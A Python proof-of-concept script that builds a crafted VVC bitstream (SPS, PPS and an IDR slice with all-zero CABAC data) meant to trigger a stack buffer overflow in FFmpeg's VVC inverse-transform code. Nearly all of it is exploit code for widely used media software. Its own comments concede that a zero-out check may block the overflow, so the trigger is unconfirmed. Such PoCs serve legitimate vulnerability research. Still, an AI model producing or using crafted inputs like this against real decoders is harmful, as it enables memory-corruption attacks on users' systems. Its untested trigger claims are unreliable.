#!/usr/bin/env python3
"""
PoC Generator for VULN_001:
Stack Buffer Overflow in matrix_mul() via DCT8/DST7 32-point Transform
File: libavcodec/vvc/itx_1d.c, lines 644-661

Vulnerability:
    static void matrix_mul(int *coeffs, ptrdiff_t stride, const int8_t *matrix,
                           int size, size_t nz)
    {
        int tmp[16];                        // buffer: 16 elements
        for (int i = 0; i < nz; i++)
            tmp[i] = coeffs[i * stride];   // OOB write when nz > 16
        ...
    }

Triggered when:
  1. sps_mts_enabled_flag = 1 AND sps_explicit_mts_intra_enabled_flag = 1
  2. sps_sbt_enabled_flag = 0  (non-SBT → log2_zo_tb_width = FFMIN(5,5) = 5)
  3. 32x32 intra CU, mts_idx = 1 (DST7) or 2 (DCT8)
  4. nzw = tb->max_scan_x + 1 > 16

Approach:
  - Generate SPS with explicit MTS enabled, no SBT, 32x32 picture (1 CTU = 1 CU)
  - Craft IDR slice with all-zero CABAC data → deterministic context decoding
  - With QP=26 (init_type=0), CABAC analysis:
      cu_coded_flag    init=6  → pre=89, MPS=1 → GET_CABAC=1  (CU is coded)
      mts_idx[0]       init=29 → pre=86, MPS=1 → GET_CABAC=1  (continue)
      mts_idx[1]       init=0  → pre=1,  MPS=0 → GET_CABAC=0  (return 1=DST7)
      last_sig_x ctxs [10..14] inits=[14,7,14,5,11]:
          ctx=10 init=14 MPS=1, ctx=11 init=7 MPS=1, ctx=12 init=14 MPS=1,
          ctx=13 init=5  MPS=1, ctx=14 init=11 MPS=0 → prefix=8
      suffix (bypass, 3 bits) = 0 → last_sig_coeff_x = (1<<3)*(2+0)+0 = 16
      → nzw = 17 > 16 → tmp[16] overflow!
  - NOTE: mts_zero_out_sig_coeff_flag logic may prevent mts_idx decode when
    last_sig_coeff is at x>=16 (xs=4 sub-block). The PoC attempts the trigger
    anyway; ASAN output will confirm whether overflow occurs.

NAL header format (VVC 16-bit, from h2645_parse.c):
  Byte 0: forbidden(1) | reserved(1) | layer_id(6)   = 0x00
  Byte 1: nal_unit_type(5<<3) | temporal_id_plus1(3)
  SPS (type=15): 0x00, 0x79
  PPS (type=16): 0x00, 0x81
  IDR_W_RADL (type=7): 0x00, 0x39
"""

import sys
import os


class BitWriter:
    """Bit-level writer for VVC RBSP construction."""
    def __init__(self):
        self.bits = []

    def write_bits(self, value, n):
        """Write n bits of value, MSB first."""
        for i in range(n - 1, -1, -1):
            self.bits.append((value >> i) & 1)

    def write_bit(self, value):
        self.bits.append(value & 1)

    def bit_pos(self):
        return len(self.bits)

    def align_to_byte(self):
        """Pad with zero bits until byte-aligned."""
        while len(self.bits) % 8 != 0:
            self.bits.append(0)

    def to_bytes(self):
        """Return bytes, zero-padding the final byte if needed."""
        self.align_to_byte()
        result = bytearray()
        for i in range(0, len(self.bits), 8):
            byte_val = 0
            for j in range(8):
                byte_val = (byte_val << 1) | self.bits[i + j]
            result.append(byte_val)
        return bytes(result)


def emulation_prevention(data):
    """
    Insert emulation prevention byte 0x03 whenever the byte sequence
    0x00 0x00 0x00, 0x00 0x00 0x01, 0x00 0x00 0x02, or 0x00 0x00 0x03
    would appear in the raw byte stream.
    """
    result = bytearray()
    zero_count = 0
    for byte in data:
        if zero_count == 2 and byte <= 3:
            result.append(0x03)
            zero_count = 0
        result.append(byte)
        if byte == 0:
            zero_count += 1
        else:
            zero_count = 0
    return bytes(result)


def write_ue(bw, v):
    """Write unsigned Exp-Golomb code for value v >= 0."""
    if v == 0:
        bw.write_bit(1)
        return
    v1 = v + 1
    m = v1.bit_length() - 1   # floor(log2(v+1))
    bw.write_bits(0, m)        # m leading zeros
    bw.write_bit(1)            # separating 1
    bw.write_bits(v1 - (1 << m), m)   # remainder in m bits


def write_se(bw, v):
    """Write signed Exp-Golomb code."""
    if v > 0:
        write_ue(bw, 2 * v - 1)
    elif v == 0:
        write_ue(bw, 0)
    else:
        write_ue(bw, -2 * v)


def build_sps_rbsp():
    """
    Build SPS RBSP for a 32x32 video with:
    - CTU size = 32 (single CTU = single CU)
    - Chroma format = 4:2:0
    - sps_mts_enabled_flag = 1
    - sps_explicit_mts_intra_enabled_flag = 1
    - sps_sbt_enabled_flag = 0 (non-SBT path)
    - min_qt_intra = 32 (one 32x32 CU covers the whole CTU)
    """
    bw = BitWriter()

    # ub(4, sps_seq_parameter_set_id) = 0
    bw.write_bits(0, 4)
    # ub(4, sps_video_parameter_set_id) = 0  → implicit VPS created
    bw.write_bits(0, 4)
    # u(3, sps_max_sublayers_minus1) = 0
    bw.write_bits(0, 3)
    # u(2, sps_chroma_format_idc) = 1  (4:2:0)
    bw.write_bits(1, 2)
    # u(2, sps_log2_ctu_size_minus5) = 0  → CTU size = 32
    bw.write_bits(0, 2)
    # flag(sps_ptl_dpb_hrd_params_present_flag) = 0  → skip PTL/DPB/HRD
    bw.write_bit(0)
    # flag(sps_gdr_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_ref_pic_resampling_enabled_flag) = 0
    bw.write_bit(0)
    # → sps_res_change_in_clvs_allowed_flag inferred = 0

    # ue(sps_pic_width_max_in_luma_samples) = 32
    write_ue(bw, 32)
    # ue(sps_pic_height_max_in_luma_samples) = 32
    write_ue(bw, 32)

    # flag(sps_conformance_window_flag) = 0
    bw.write_bit(0)
    # u(1, sps_subpic_info_present_flag) = 0
    bw.write_bit(0)

    # ue(sps_bitdepth_minus8) = 0  → 8-bit
    write_ue(bw, 0)

    # flag(sps_entropy_coding_sync_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_entry_point_offsets_present_flag) = 0
    bw.write_bit(0)

    # u(4, sps_log2_max_pic_order_cnt_lsb_minus4) = 0
    bw.write_bits(0, 4)
    # flag(sps_poc_msb_cycle_flag) = 0
    bw.write_bit(0)

    # u(2, sps_num_extra_ph_bytes) = 0
    bw.write_bits(0, 2)
    # u(2, sps_num_extra_sh_bytes) = 0
    bw.write_bits(0, 2)

    # ptl_dpb_hrd=0 → skip DPB params

    # ue(sps_log2_min_luma_coding_block_size_minus2) = 0  → min CB = 4
    write_ue(bw, 0)
    # flag(sps_partition_constraints_override_enabled_flag) = 0
    bw.write_bit(0)

    # ue(sps_log2_diff_min_qt_min_cb_intra_slice_luma) = 3
    #   min_qt_log2 = 2 + 3 = 5  → min QT = 32 (= CTU, so whole CTU = 1 CU)
    write_ue(bw, 3)
    # ue(sps_max_mtt_hierarchy_depth_intra_slice_luma) = 0  → no BT/TT splits
    write_ue(bw, 0)
    # depth=0 → sps_log2_diff_max_bt/tt_min_qt_intra_luma inferred=0

    # flag(sps_qtbtt_dual_tree_intra_flag) = 0  (written for chroma_format_idc=1)
    bw.write_bit(0)
    # → dual_tree=0: no chroma partition params

    # ue(sps_log2_diff_min_qt_min_cb_inter_slice) = 0
    write_ue(bw, 0)
    # ue(sps_max_mtt_hierarchy_depth_inter_slice) = 0
    write_ue(bw, 0)
    # depth=0 → bt/tt inter params inferred=0

    # ctb_size_y = 32 ≤ 32 → sps_max_luma_transform_size_64_flag INFERRED=0 (not written)

    # flag(sps_transform_skip_enabled_flag) = 0
    bw.write_bit(0)
    # → no log2_transform_skip_max_size, no bdpcm

    # flag(sps_mts_enabled_flag) = 1  ← CRITICAL
    bw.write_bit(1)
    # flag(sps_explicit_mts_intra_enabled_flag) = 1  ← CRITICAL
    bw.write_bit(1)
    # flag(sps_explicit_mts_inter_enabled_flag) = 0
    bw.write_bit(0)

    # flag(sps_lfnst_enabled_flag) = 0
    bw.write_bit(0)

    # chroma_format_idc=1 ≠ 0: write chroma-specific QP table fields
    # flag(sps_joint_cbcr_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_same_qp_table_for_chroma_flag) = 1  → num_qp_tables=1
    bw.write_bit(1)
    # For i=0:
    #   ses(sps_qp_table_start_minus26[0]) = se(0) = ue(0) = 1
    write_se(bw, 0)
    #   ues(sps_num_points_in_qp_table_minus1[0]) = ue(0) = 1
    write_ue(bw, 0)
    # For j=0:
    #   ues(sps_delta_qp_in_val_minus1[0][0]) = ue(0) = 1
    write_ue(bw, 0)
    #   ues(sps_delta_qp_diff_val[0][0]) = ue(0) = 1
    write_ue(bw, 0)

    # flag(sps_sao_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_alf_enabled_flag) = 0
    bw.write_bit(0)
    # alf=0 → sps_ccalf_enabled_flag inferred=0 (not written)
    # flag(sps_lmcs_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_weighted_pred_flag) = 0
    bw.write_bit(0)
    # flag(sps_weighted_bipred_flag) = 0
    bw.write_bit(0)
    # flag(sps_long_term_ref_pics_flag) = 0
    bw.write_bit(0)
    # sps_video_parameter_set_id=0 → sps_inter_layer_prediction_enabled_flag INFERRED=0
    # flag(sps_idr_rpl_present_flag) = 0
    bw.write_bit(0)
    # flag(sps_rpl1_same_as_rpl0_flag) = 0
    bw.write_bit(0)
    # for i=0,1: sps_num_ref_pic_lists[i] = ue(0)
    write_ue(bw, 0)
    write_ue(bw, 0)

    # flag(sps_ref_wraparound_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_temporal_mvp_enabled_flag) = 0
    bw.write_bit(0)
    # → sps_sbtmvp_enabled_flag inferred=0
    # flag(sps_amvr_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_bdof_enabled_flag) = 0
    bw.write_bit(0)
    # → sps_bdof_control_present_in_ph_flag inferred=0
    # flag(sps_smvd_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_dmvr_enabled_flag) = 0
    bw.write_bit(0)
    # → sps_dmvr_control_present_in_ph_flag inferred=0
    # flag(sps_mmvd_enabled_flag) = 0
    bw.write_bit(0)
    # → sps_mmvd_fullpel_only_enabled_flag inferred=0

    # ue(sps_six_minus_max_num_merge_cand) = 5  → max_merge_cand = 1
    write_ue(bw, 5)
    # max_merge_cand=1 < 2 → sps_gpm_enabled_flag inferred=0 (not written)

    # flag(sps_sbt_enabled_flag) = 0  ← CRITICAL: non-SBT path
    bw.write_bit(0)

    # flag(sps_affine_enabled_flag) = 0
    bw.write_bit(0)
    # → affine sub-fields inferred=0

    # flag(sps_bcw_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_ciip_enabled_flag) = 0
    bw.write_bit(0)

    # ue(sps_log2_parallel_merge_level_minus2) = 0
    write_ue(bw, 0)

    # flag(sps_isp_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_mrl_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_mip_enabled_flag) = 0
    bw.write_bit(0)

    # chroma_format_idc=1 ≠ 0:
    # flag(sps_cclm_enabled_flag) = 0
    bw.write_bit(0)
    # chroma_format_idc=1:
    # flag(sps_chroma_horizontal_collocated_flag) = 1
    bw.write_bit(1)
    # flag(sps_chroma_vertical_collocated_flag) = 1
    bw.write_bit(1)

    # flag(sps_palette_enabled_flag) = 0
    bw.write_bit(0)
    # chroma_format_idc != 3 → sps_act_enabled_flag INFERRED=0 (not written)
    # transform_skip=0, palette=0 → no sps_min_qp_prime_ts

    # flag(sps_ibc_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_ladf_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_explicit_scaling_list_enabled_flag) = 0
    bw.write_bit(0)
    # lfnst=0 → no scaling_matrix_for_lfnst_disabled_flag
    # act=0 → sps_scaling_matrix_for_alt_colour_space_disabled_flag INFERRED=0

    # flag(sps_dep_quant_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_sign_data_hiding_enabled_flag) = 0
    bw.write_bit(0)
    # flag(sps_virtual_boundaries_enabled_flag) = 0
    bw.write_bit(0)

    # ptl_dpb_hrd=0 → no timing HRD

    # flag(sps_field_seq_flag) = 0
    bw.write_bit(0)
    # flag(sps_vui_parameters_present_flag) = 0
    bw.write_bit(0)
    # flag(sps_extension_flag) = 0
    bw.write_bit(0)

    # RBSP trailing bits
    bw.write_bit(1)
    bw.align_to_byte()

    return bw.to_bytes()


def build_pps_rbsp():
    """
    Build PPS RBSP with:
    - pps_no_pic_partition_flag = 1 (single tile/slice, simplest structure)
    - pps_init_qp_minus26 = 0 → base QP = 26
    """
    bw = BitWriter()

    # ub(6, pps_pic_parameter_set_id) = 0
    bw.write_bits(0, 6)
    # ub(4, pps_seq_parameter_set_id) = 0
    bw.write_bits(0, 4)

    # flag(pps_mixed_nalu_types_in_pic_flag) = 0
    bw.write_bit(0)

    # ue(pps_pic_width_in_luma_samples) = 32
    write_ue(bw, 32)
    # ue(pps_pic_height_in_luma_samples) = 32
    write_ue(bw, 32)

    # flag(pps_conformance_window_flag) = 0
    bw.write_bit(0)
    # flag(pps_scaling_window_explicit_signalling_flag) = 0
    bw.write_bit(0)
    # flag(pps_output_flag_present_flag) = 0
    bw.write_bit(0)
    # flag(pps_no_pic_partition_flag) = 1
    bw.write_bit(1)
    # flag(pps_subpic_id_mapping_present_flag) = 0
    bw.write_bit(0)

    # pps_no_pic_partition_flag=1 → skip tile/slice partition section

    # flag(pps_cabac_init_present_flag) = 0
    bw.write_bit(0)
    # ues(pps_num_ref_idx_default_active_minus1[0]) = ue(0)
    write_ue(bw, 0)
    # ues(pps_num_ref_idx_default_active_minus1[1]) = ue(0)
    write_ue(bw, 0)
    # flag(pps_rpl1_idx_present_flag) = 0
    bw.write_bit(0)
    # flag(pps_weighted_pred_flag) = 0
    bw.write_bit(0)
    # flag(pps_weighted_bipred_flag) = 0
    bw.write_bit(0)
    # flag(pps_ref_wraparound_enabled_flag) = 0
    bw.write_bit(0)

    # se(pps_init_qp_minus26) = 0  → base QP = 26
    write_se(bw, 0)

    # flag(pps_cu_qp_delta_enabled_flag) = 0
    bw.write_bit(0)
    # flag(pps_chroma_tool_offsets_present_flag) = 0
    bw.write_bit(0)
    # → chroma QP offsets inferred=0

    # flag(pps_deblocking_filter_control_present_flag) = 1
    bw.write_bit(1)
    # flag(pps_deblocking_filter_override_enabled_flag) = 0
    bw.write_bit(0)
    # flag(pps_deblocking_filter_disabled_flag) = 0
    bw.write_bit(0)
    # pps_no_pic_partition_flag=1 → pps_dbf_info_in_ph_flag INFERRED=0
    # filter not disabled → write luma offsets:
    # se(pps_luma_beta_offset_div2) = 0
    write_se(bw, 0)
    # se(pps_luma_tc_offset_div2) = 0
    write_se(bw, 0)
    # chroma_tool_offsets=0 → chroma offsets inferred

    # pps_no_pic_partition_flag=1 → rpl/sao/alf/wp/qp_delta_info flags NOT written

    # flag(pps_picture_header_extension_present_flag) = 0
    bw.write_bit(0)
    # flag(pps_slice_header_extension_present_flag) = 0
    bw.write_bit(0)
    # flag(pps_extension_flag) = 0
    bw.write_bit(0)

    # RBSP trailing bits
    bw.write_bit(1)
    bw.align_to_byte()

    return bw.to_bytes()


def build_slice_rbsp():
    """
    Build IDR_W_RADL slice RBSP with embedded picture header.
    slice_header() includes:
      - sh_picture_header_in_slice_header_flag = 1
      - picture_header() embedded
      - sh_no_output_of_prior_pics_flag = 0
      - sh_qp_delta = 0  → slice QP = 26

    After the RBSP trailing bits, 512 bytes of 0x00 follow as
    CABAC-coded slice data.

    With QP=26 and all-0x00 CABAC data (init_type=0, I-slice):
      GET_CABAC with MPS=1 → 1  (range>>17 >> low=0)
      GET_CABAC with MPS=0 → 0
      Bypass decode → 0

    Expected CABAC decoding:
      cu_coded_flag (init=6, MPS=1)     → 1 (CU is coded)
      mts_idx[0]   (init=29, MPS=1)     → 1 (continue)
      mts_idx[1]   (init=0,  MPS=0)     → 0 (return 1 = DST7)
      last_sig_coeff_x contexts [10..14] with inits [14,7,14,5,11]:
          all MPS=1 except ctx=14 (init=11, MPS=0 at QP=26)
          → prefix=8, bypass suffix=0 → last_sig_x = (1<<3)*(2+0)+0 = 16
      last_sig_coeff_y: same → 16
      → last_sub_block at xs=4 (x>=16) → sets mts_zero_out_sig_coeff_flag=0
      → mts_idx decode blocked (mts_flag=0) → DCT2 used

    Note: the mts_zero_out_sig_coeff_flag check prevents the exact
    matrix_mul overflow path. This PoC exercises the full code path
    and may expose additional issues.
    """
    bw = BitWriter()

    # --- slice_header() begins ---

    # flag(sh_picture_header_in_slice_header_flag) = 1
    bw.write_bit(1)

    # --- picture_header() embedded ---

    # flag(ph_gdr_or_irap_pic_flag) = 1  (IDR is IRAP)
    bw.write_bit(1)
    # flag(ph_non_ref_pic_flag) = 0
    bw.write_bit(0)
    # ph_gdr_or_irap_pic_flag=1 → flag(ph_gdr_pic_flag) = 0  (IDR, not GDR)
    bw.write_bit(0)
    # flag(ph_inter_slice_allowed_flag) = 0  → ph_intra_slice_allowed_flag inferred=1
    bw.write_bit(0)

    # ue(ph_pic_parameter_set_id) = 0
    write_ue(bw, 0)

    # ub(4, ph_pic_order_cnt_lsb) = 0  (log2_max_poc_lsb_minus4=0 → 4 bits)
    bw.write_bits(0, 4)

    # ph_gdr_pic_flag=0 → no ph_recovery_poc_cnt
    # sps_num_extra_ph_bytes=0 → no extra ph bits
    # sps_poc_msb_cycle_flag=0 → no ph_poc_msb fields
    # sps_alf_enabled_flag=0 → ph_alf_enabled_flag inferred=0 (not written via pps_alf_info_in_ph_flag)
    # Actually: pps_alf_info_in_ph_flag=0 (pps_no_pic_partition_flag=1 → inferred=0)
    # → the alf_info_in_ph path: if (!pps->pps_alf_info_in_ph_flag) → goes to else: infer ph_alf_enabled_flag=0
    # sps_lmcs_enabled_flag=0 → ph_lmcs_enabled_flag inferred=0
    # sps_explicit_scaling_list_enabled_flag=0 → ph_explicit_scaling_list_enabled_flag inferred=0
    # sps_virtual_boundaries_enabled_flag=0 → no virtual boundary fields
    # pps_output_flag_present_flag=0 → ph_pic_output_flag inferred=1
    # pps_rpl_info_in_ph_flag=0 (inferred since pps_no_pic_partition=1) → no ref_pic_lists
    # sps_partition_constraints_override_enabled_flag=0 → ph_partition_constraints_override_flag inferred=0
    # ph_intra_slice_allowed_flag=1 → intra partition constraints section:
    #   ph_partition_constraints_override_flag=0 → all inferred from SPS (no bits written)
    # pps_cu_qp_delta_enabled_flag=0 → no ph_cu_qp_delta_subdiv_intra_slice
    # pps_cu_chroma_qp_offset_list_enabled_flag=0 → no ph_cu_chroma_qp_offset_subdiv
    # ph_inter_slice_allowed_flag=0 → no inter slice partition constraints
    # pps_qp_delta_info_in_ph_flag=0 (inferred since pps_no_pic_partition=1) → no ph_qp_delta
    # sps_joint_cbcr_enabled_flag=0 → ph_joint_cbcr_sign_flag inferred=0
    # sps_sao_enabled_flag=0 → ph_sao flags inferred=0
    # pps_dbf_info_in_ph_flag=0 (inferred) → ph_deblocking_params_present_flag inferred=0
    # pps_picture_header_extension_present_flag=0 → no ph_extension

    # --- picture_header() ends ---

    # --- slice_header() continues ---

    # sh_picture_header_in_slice_header_flag=1 → sh_subpic info not in SH (not written)
    # sps_subpic_info_present_flag=0 → sh_subpic_id not written; curr_subpic_idx=0

    # Only 1 tile (pps_no_pic_partition_flag=1) → sh_slice_address inferred=0

    # sps_num_extra_sh_bytes=0 → no extra sh bits
    # pps_rect_slice_flag and num_tiles logic → sh_num_tiles_in_slice_minus1 inferred=0

    # ph_inter_slice_allowed_flag=0 → sh_slice_type inferred=2 (I-slice)

    # nal_unit_type = VVC_IDR_W_RADL (7) → write sh_no_output_of_prior_pics_flag
    # flag(sh_no_output_of_prior_pics_flag) = 0
    bw.write_bit(0)

    # sps_alf_enabled_flag=0 → alf section skipped
    # sh_picture_header_in_slice_header_flag=1 → lmcs/scaling_list flags inferred
    # IDR + !sps_idr_rpl_present_flag → no ref_pic_lists in SH
    # sh_slice_type=I → no inter flags
    # pps_qp_delta_info_in_ph_flag=0 → write sh_qp_delta
    # se(sh_qp_delta) = 0  → slice QP = pps_init_qp(26) + 0 = 26
    write_se(bw, 0)

    # pps_slice_chroma_qp_offsets_present_flag=0 → no chroma QP in SH
    # pps_cu_chroma_qp_offset_list_enabled_flag=0 → no sh_cu_chroma_qp_offset_enabled_flag
    # sps_sao_enabled_flag=0 → no SAO flags in SH
    # pps_deblocking_filter_override_enabled_flag=0 → sh_deblocking_params_present_flag inferred=0
    # sps_dep_quant_enabled_flag=0 → sh_dep_quant_used_flag inferred=0
    # sps_sign_data_hiding_enabled_flag=0 → sh_sign_data_hiding_used_flag inferred=0
    # sps_transform_skip_enabled_flag=0 → sh_ts_residual_coding_disabled_flag inferred=0
    # sps_reverse_last_sig_coeff_enabled_flag=0 → sh_reverse_last_sig_coeff_flag inferred=0
    # pps_slice_header_extension_present_flag=0 → no extension
    # sps_entry_point_offsets_present_flag=0 → num_entry_points=0

    # RBSP trailing bits (end of slice header)
    bw.write_bit(1)
    bw.align_to_byte()

    # Slice header bytes completed; now append CABAC-coded slice data.
    # All-zero bytes → deterministic CABAC decoding (all MPS contexts return MPS value,
    # bypass contexts return 0).
    slice_header_bytes = bw.to_bytes()
    cabac_data = bytes(512)   # 512 bytes of 0x00

    return slice_header_bytes + cabac_data


def wrap_nal(nal_header_bytes, payload_bytes):
    """
    Wrap payload as a single NAL unit with emulation prevention,
    preceded by 4-byte Annex B start code.
    nal_header_bytes: 2 bytes (VVC NAL header)
    payload_bytes: RBSP bytes (for SPS/PPS) or slice_rbsp+cabac (for slices)
    """
    raw = bytes(nal_header_bytes) + payload_bytes
    nal_with_ep = emulation_prevention(raw)
    return b'\x00\x00\x00\x01' + nal_with_ep


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(out_dir, 'vuln_001_input.vvc')
    if len(sys.argv) > 1:
        output_file = sys.argv[1]

    # Build RBSP payloads
    sps_rbsp   = build_sps_rbsp()
    pps_rbsp   = build_pps_rbsp()
    slice_rbsp = build_slice_rbsp()

    # NAL unit headers (VVC 16-bit):
    #   Byte 0: 0x00 (forbidden=0, reserved=0, layer_id=0)
    #   Byte 1: (nal_unit_type << 3) | temporal_id_plus1
    #   SPS       (type=15): 0x00, 0x79
    #   PPS       (type=16): 0x00, 0x81
    #   IDR_W_RADL(type=7):  0x00, 0x39
    sps_nal_hdr   = [0x00, 0x79]
    pps_nal_hdr   = [0x00, 0x81]
    slice_nal_hdr = [0x00, 0x39]   # IDR_W_RADL, layer_id=0, temporal_id=1

    # Assemble Annex B bitstream: SPS + PPS + IDR slice
    bitstream = (wrap_nal(sps_nal_hdr,   sps_rbsp)
               + wrap_nal(pps_nal_hdr,   pps_rbsp)
               + wrap_nal(slice_nal_hdr, slice_rbsp))

    with open(output_file, 'wb') as f:
        f.write(bitstream)

    print(f'[+] Generated: {output_file}')
    print(f'[+] Total file size: {len(bitstream)} bytes')
    print(f'[+] SPS RBSP: {len(sps_rbsp)} bytes')
    print(f'[+] PPS RBSP: {len(pps_rbsp)} bytes')
    print(f'[+] Slice RBSP+CABAC: {len(slice_rbsp)} bytes')
    print()
    print('[*] Trigger conditions attempted:')
    print('    sps_mts_enabled_flag               = 1')
    print('    sps_explicit_mts_intra_enabled_flag = 1')
    print('    sps_sbt_enabled_flag               = 0  (non-SBT path)')
    print('    Picture: 32x32 (1 CTU = 1 CU of 32x32)')
    print('    min_qt_intra = 32 (no QT splits)')
    print('    max_mtt_depth_intra = 0 (no BT/TT splits)')
    print('    CABAC data: 512 bytes of 0x00')
    print()
    print('[*] Expected CABAC with QP=26, init_type=0 (I-slice):')
    print('    cu_coded_flag (init=6, MPS=1)      → 1 (CU coded)')
    print('    mts_idx[0]    (init=29, MPS=1)     → 1 (continue)')
    print('    mts_idx[1]    (init=0, MPS=0)      → 0 (return 1 = DST7)')
    print('    last_sig_x prefix=8, suffix=0      → last_sig_coeff_x = 16')
    print('    → nzw = 17 > 16 → matrix_mul tmp[16] overflow attempted')
    print()
    print('[!] Note: mts_zero_out_sig_coeff_flag may be cleared by')
    print('    the last_sub_block at xs=4 (x>=16), preventing mts_idx')
    print('    decode and defaulting to DCT2. Run to confirm behavior.')


if __name__ == '__main__':
    main()
